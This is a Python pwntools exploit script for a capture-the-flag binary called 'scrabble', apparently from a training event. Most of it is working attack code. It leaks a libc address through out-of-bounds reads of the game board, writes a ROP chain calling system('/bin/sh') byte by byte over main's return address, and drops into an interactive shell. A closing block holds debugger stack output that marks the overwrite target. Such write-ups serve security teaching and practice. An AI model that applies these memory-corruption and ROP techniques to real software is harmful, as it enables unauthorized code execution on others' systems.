from pwn import *

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
exe = ELF("./scrabble")

GDB_SCRIPT = f"""
set disassembly-flavor intel
break *main
continue
"""

context.binary = exe
context.aslr = False
IP     = 'localhost'   
PORT   = 30000

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # argv = [ld.path, exe.path]
        # env = {"LD_PRELOAD": libc.path}
        # r = process(argv, env=env)
        if args.GDB:
            gdb.attach(r, gdbscript=GDB_SCRIPT)
    else:
        r = remote(IP, PORT)
    return r

context.log_level = 'debug'
t = conn()
# get libc leak
sla(b"Choice: ", b"1")
sla(b"row: ", b"0")
sla(b"column: ", b"0")
sla(b"character: ", b"a")
ru(b"====Current Board====\n")
for _ in range(11):
    ru(b"-----------------------------\n")
for _ in range(11):
    ru(b"|")
libc_leak = 0
for i in range(5):
    x = ru(b"|")
    char_leaked = x[-2]
    libc_leak += char_leaked << (i * 8)

ru(b"|")
for i in range(3):
    x = ru(b"|")
    char_leaked = x[-2]
    libc_leak += char_leaked << ((i + 5) * 8)

lhex(libc_leak, "libc leak")
libc.address = libc_leak - (0x0000155555417600 - 0x0000155555200000)
lhex(libc.address, "libc address")

# returns a tuple (row #, col #)
def get_row_and_col(rsp_addr, target_addr):
    addr_diff = target_addr - rsp_addr 
    dist_from_board_to_target = addr_diff - 0x20 # the board starts at rsp + 0x20
    row = dist_from_board_to_target // 15
    col = dist_from_board_to_target % 15
    return (row, col)

# writes 8 bytes at a target address
def stack_write(rsp_addr, target_addr, val):
    for i in range(8):
        r, c = get_row_and_col(rsp_addr, target_addr + i)
        mask = 0xFF << (8 * i)
        val_masked = mask & val 
        val_int_byte = val_masked >> (8 * i)
        sla(b"Choice: ", b"1")
        sla(b"row: ", str(r).encode())
        sla(b"column: ", str(c).encode())
        sla(b"character: ", bytes([val_int_byte]))

POP_RDI = libc.address + 0x000000000002a3e5
BINSH = next(libc.search(b"/bin/sh"))
POP_RSI = libc.address + 0x000000000002be51
POP_RAX = libc.address + 0x0000000000045eb0
RET = libc.address + 0x0000000000029139

stack_write(0x7fffffffd4f0, 0x7fffffffd608, POP_RDI)
stack_write(0x7fffffffd4f0, 0x7fffffffd610, BINSH)
stack_write(0x7fffffffd4f0, 0x7fffffffd618, RET)
stack_write(0x7fffffffd4f0, 0x7fffffffd620, libc.sym['system'])
sla(b"Choice: ", b"2")
it()

"""
====Current Board====
-----------------------------
|a|a|||||||||||||
-----------------------------
||||||||||||||||
-----------------------------
|||||||||||||||�|
-----------------------------
||||||||||||||||
-----------------------------
||||||||||||||||
-----------------------------
||||||||||||||||
-----------------------------
||||||�|||||||||�|
-----------------------------
|�|�|�|�||||||||||||
-----------------------------
|�|�|�|�|�|||||||||||
-----------------------------
||�|�|�|�|�||||||||||
-----------------------------
|||||||||||b|b|b|b|b|         <- libc leak 
-----------------------------
|b|b|b|�|�|�|�|�||||�|�|�|�|
-----------------------------
|�||||�||�|�|�|||||||
-----------------------------
||||||`|�|�|�|�||||�|�|
-----------------------------
|�|�|�||||�|T|U|U|U|U|||�|
-----------------------------

$rsp  0x7fffffffd4f0|+0x0000|+000: 0x0000000000108000
      0x7fffffffd4f8|+0x0008|+001: 0x000000016100000c 
      0x7fffffffd500|+0x0010|+002: 0x0000000000000000
      0x7fffffffd508|+0x0018|+003: 0x0000000f0000000f
      0x7fffffffd510|+0x0020|+004: 0x0000000000000061 <- row 0 col 0 is here, the 0x61
      0x7fffffffd518|+0x0028|+005: 0x0000000000000008
      0x7fffffffd520|+0x0030|+006: 0x0000000000000000
      0x7fffffffd528|+0x0038|+007: 0x0000000100000000
      0x7fffffffd530|+0x0040|+008: 0x0000000000000000
      0x7fffffffd538|+0x0048|+009: 0x0000009a00000006
      0x7fffffffd540|+0x0050|+010: 0x0000000000000002
      0x7fffffffd548|+0x0058|+011: 0x8000000000000006
      0x7fffffffd550|+0x0060|+012: 0x0000000000000000
      0x7fffffffd558|+0x0068|+013: 0x0000000000000000
      0x7fffffffd560|+0x0070|+014: 0x0000000000000000
      0x7fffffffd568|+0x0078|+015: 0x0000000000000000
      0x7fffffffd570|+0x0080|+016: 0x0000000000000000
      0x7fffffffd578|+0x0088|+017: 0x000015555541b6a0 <_IO_2_1_stderr_>  ->  0x00000000fbad2087
      0x7fffffffd580|+0x0090|+018: 0x0000000000000000
      0x7fffffffd588|+0x0098|+019: 0x000015555528e3f5 <_IO_default_setbuf+0x45>  ->  0x0000a2840ffff883
      0x7fffffffd590|+0x00a0|+020: 0x000000000000000d
      0x7fffffffd598|+0x00a8|+021: 0x000015555541b6a0 <_IO_2_1_stderr_>  ->  0x00000000fbad2087
      0x7fffffffd5a0|+0x00b0|+022: 0x0000000000000000
      0x7fffffffd5a8|+0x00b8|+023: 0x0000000000000000
      0x7fffffffd5b0|+0x00c0|+024: 0x0000155555417600 <_IO_file_jumps>  ->  0x0000000000000000
      0x7fffffffd5b8|+0x00c8|+025: 0x000015555528a5ad <_IO_file_setbuf+0xd>  ->  0x7e0ff31874c08548
      0x7fffffffd5c0|+0x00d0|+026: 0x000015555541b6a0 <_IO_2_1_stderr_>  ->  0x00000000fbad2087
      0x7fffffffd5c8|+0x00d8|+027: 0x00001555552816e5 <setvbuf+0xf5>  ->  0x1945138b01f88348
      0x7fffffffd5d0|+0x00e0|+028: 0x0000000000000000
      0x7fffffffd5d8|+0x00e8|+029: 0x00007fffffffd600  ->  0x00007fffffffd610  ->  0x0000000000000001  <-  $rbp
      0x7fffffffd5e0|+0x00f0|+030: 0x00007fffffffd728  ->  0x00007fffffffda19  ->  0x552f632f746e6d2f '/mnt/c/Users/chiae/Downloads/greycademy25-challs/greycademy-fina[...]'  <-  $r12
      0x7fffffffd5e8|+0x00f8|+031: 0x00005555555554f1 <main>  ->  0xe5894855fa1e0ff3  <-  $r13
      0x7fffffffd5f0|+0x0100|+032: 0x0000555555557d90 <__do_global_dtors_aux_fini_array_entry>  ->  0x00005555555551c0 <__do_global_dtors_aux>  ->  0x2e7d3d80fa1e0ff3  <-  $r14
      0x7fffffffd5f8|+0x0108|+033: 0x7c88b947ace94e00  <-  canary
$rbp  0x7fffffffd600|+0x0110|+034: 0x00007fffffffd610  ->  0x0000000000000001
      0x7fffffffd608|+0x0118|+035: 0x000055555555550d <main+0x1c>  ->  0xf3c35d00000000b8  <-  retaddr[1] <- OVERWRITE THIS RETURN ADDRESS
"""